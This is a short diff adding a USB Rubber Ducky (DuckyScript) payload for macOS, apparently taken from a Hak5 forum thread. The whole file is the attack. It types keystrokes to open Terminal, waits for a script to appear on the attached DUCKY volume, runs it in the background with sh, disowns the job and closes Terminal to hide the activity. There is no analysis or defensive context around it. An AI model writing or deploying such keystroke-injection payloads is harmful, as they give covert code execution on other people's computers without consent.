@@ -1,0 +1,14 @@
+REM https://forums.hak5.org/index.php?/topic/34697-payload-osx-run-duckslurp-shell-in-the-background-asap/
+DELAY 3000
+COMMAND SPACE
+DELAY 200
+STRING terminal
+ENTER
+DELAY 200
+STRING while [ ! -f /Volumes/DUCKY/a ] ; do sleep 2 ; done && sh /Volumes/DUCKY/a &
+ENTER
+STRING disown
+ENTER
+STRING exit
+ENTER
+COMMAND Q
